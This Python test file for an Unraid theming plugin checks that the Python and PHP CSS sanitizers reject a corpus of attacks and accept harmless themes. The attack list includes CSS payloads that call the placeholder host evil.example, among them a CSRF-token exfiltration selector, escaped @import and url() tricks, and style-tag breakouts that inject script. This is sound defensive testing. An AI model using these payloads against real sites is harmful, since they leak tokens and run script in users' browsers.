#!/usr/bin/env python3
"""Hold both CSS rule implementations to one corpus.

Run:  python3 test/test_css_rules.py [--require-php] [--php "<command>"]

scripts/css_rules.py (CI and the bots) and themer_css_violation() in
UnraidThemer.page (the plugin) must reject every attack below and accept every
harmless stylesheet, including all registry and bundled themes. The PHP side is
taken verbatim from the .page (between the css-rules markers) and run with the
`php` binary, or the command given with --php. CI passes --require-php, so a
runner without PHP fails instead of quietly testing only half."""
import glob, json, os, shlex, shutil, subprocess, sys, tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "scripts"))
from css_rules import violations  # noqa: E402

PAGE = os.path.join(ROOT, "plugin/usr/local/emhttp/plugins/unraid.themer/UnraidThemer.page")
EVIL = "https://evil.example/x"

# every entry must be refused; each is a way the old blocklist was beaten or a
# close relative of one
ATTACKS = {
    "plain url()":              f":root{{--x:1}} body{{background:url({EVIL})}}",
    "relative url()":           ":root{--x:1} body{background:url(/x.png)}",
    "url() in a variable":      f":root{{--bg:url('{EVIL}')}}",
    "image-set()":              f':root{{--x:1}} body{{background:image-set("{EVIL}" 1x)}}',
    "-webkit-image-set()":      ':root{--x:1} body{background:-webkit-image-set("//evil.example/x" 1x)}',
    "hex escape in url":        ":root{--x:1} body{background:url(\\68ttps://evil.example/x)}",
    "char escape in url":       ":root{--x:1} body{background:url(ht\\tps://evil.example/x)}",
    "escaped @import":          f'@\\69mport "{EVIL}.css";\n:root{{--x:1}}',
    "@import":                  f'@import "{EVIL}.css";\n:root{{--x:1}}',
    "@IMPORT upper case":       f'@IMPORT url("{EVIL}.css");\n:root{{--x:1}}',
    "@font-face src":           f'@font-face{{font-family:x;src:url({EVIL}.woff)}} :root{{--x:1}}',
    "csrf token exfiltration":  f':root{{--x:1}} input[name=csrf_token][value^="a"]~*{{background:image-set("{EVIL}?p=a")}}',
    "cross-fade()":             f':root{{--x:1}} body{{background:cross-fade(url({EVIL}),red 50%)}}',
    "image()":                  f':root{{--x:1}} body{{background:image("{EVIL}")}}',
    "src() function":           f':root{{--x:1}} body{{background:src("{EVIL}")}}',
    "-moz-element()":           ":root{--x:1} body{background:-moz-element(#x)}",
    "attr()":                   ":root{--x:1} a::after{content:attr(href)}",
    "comment hides nothing":    f":root{{--x:1}} body{{background:url/**/({EVIL})}}",
    "@namespace":               ':root{--x:1} @namespace svg "http://www.w3.org/2000/svg";',
    "@charset":                 '@charset "utf-8"; :root{--x:1}',
    "@layer":                   ":root{--x:1} @layer x{body{color:red}}",
    "closing style tag":        ":root{--x:1}</style><script>alert(1)</script>",
    "html comment open":        ":root{--x:1} <!-- x -->",
    "tag without slash":        ":root{--x:1} <img src=x onerror=alert(1)>",
    "javascript: uri":          ":root{--x:javascript:alert(1)}",
    "expression()":             ":root{--x:1} body{width:expression(alert(1))}",
    "behavior:":                ":root{--x:1} body{behavior:foo}",
    "-moz-binding":             ":root{--x:1} body{-moz-binding:x}",
    # deliberately refused: an @ in a string looks like an at-rule without a tokenizer
    "@ inside a string":        ':root{--x:1} a::after{content:"support@example.com"}',
    "oversize":                 ":root{--x:1}" + "/*" + "a" * (512 * 1024) + "*/",
}

# every entry must be accepted: what themes actually do
HARMLESS = {
    "colours and vars":  ":root{--background-color:#101010;--text-color:rgb(240 240 240);--a:var(--b, #fff)}",
    "calc and mix":      ":root{--w:calc(100% - 2rem);--c:color-mix(in srgb, red 40%, blue)}",
    "media query":       ":root{--x:1} @media (max-width: 800px){body{font-size:14px}}",
    "supports":          ":root{--x:1} @supports (display:grid){body{display:grid}}",
    "fonts by name":     ':root{--font:"Inter", system-ui, sans-serif}',
    "background-image property": ":root{--x:1} body{background-image:none;background-image:linear-gradient(red,blue)}",
    "comment with url text":     "/* inspired by https://example.com and @someone */ :root{--x:1}",
    "child combinator":  ":root{--x:1} ul > li{color:red}",
    "media range":       ":root{--x:1} @media (width < 800px){body{font-size:14px}}",
    "media range both sides": ":root{--x:1} @media (400px <= width <= 800px){body{font-size:14px}}",
}


def php_verdicts(cases, php_cmd):
    """Run the PHP rules from the .page on every case; returns {name: error}."""
    src = open(PAGE, encoding="utf-8").read()
    begin, end = src.index("// --- css-rules:begin"), src.index("// --- css-rules:end")
    tmp = tempfile.mkdtemp(prefix="themer-css-")
    try:
        with open(os.path.join(tmp, "cases.json"), "w", encoding="utf-8") as f:
            json.dump(cases, f)
        with open(os.path.join(tmp, "run.php"), "w", encoding="utf-8") as f:
            f.write("<?php\n" + src[begin:end] + "\n"
                    "$cases = json_decode(file_get_contents($argv[1]), true);\n"
                    "$out = [];\n"
                    "foreach ($cases as $k => $css) $out[$k] = themer_sanitize_css($css)[1];\n"
                    "echo json_encode($out);\n")
        cmd = shlex.split(php_cmd) + [os.path.join(tmp, "run.php"), os.path.join(tmp, "cases.json")]
        res = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return json.loads(res.stdout)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def main():
    args = sys.argv[1:]
    require_php = "--require-php" in args
    php_cmd = args[args.index("--php") + 1] if "--php" in args else ("php" if shutil.which("php") else None)

    themes = {}
    for p in sorted(glob.glob(os.path.join(ROOT, "themes/*.css"))
                    + glob.glob(os.path.join(ROOT, "plugin/usr/local/emhttp/plugins/unraid.themer/defaults/*.css"))
                    + glob.glob(os.path.join(ROOT, "plugin/usr/local/emhttp/plugins/unraid.themer/presets/*.css"))):
        themes["theme " + os.path.relpath(p, ROOT)] = open(p, encoding="utf-8").read()
    accept = {**HARMLESS, **themes}
    cases = {**ATTACKS, **accept}

    checks = []
    for name, css in ATTACKS.items():
        checks.append((f"py   refuses {name}", bool(violations(css))))
    for name, css in accept.items():
        checks.append((f"py   accepts {name}", not violations(css)))

    if php_cmd:
        php = php_verdicts(cases, php_cmd)
        for name in ATTACKS:
            checks.append((f"php  refuses {name}", php.get(name, "") != ""))
        for name in accept:
            checks.append((f"php  accepts {name}", php.get(name) == ""))
    elif require_php:
        checks.append(("php  available (--require-php)", False))
    else:
        print("  NOTE  no php binary: PHP side not checked (CI runs it with --require-php)")

    bad = 0
    for label, ok in checks:
        if not ok or "--verbose" in args:
            print(f"  {'PASS' if ok else 'FAIL'}  {label}")
        bad += 0 if ok else 1
    print(f"\n{len(checks) - bad}/{len(checks)} checks passed")
    sys.exit(1 if bad else 0)


if __name__ == "__main__":
    main()
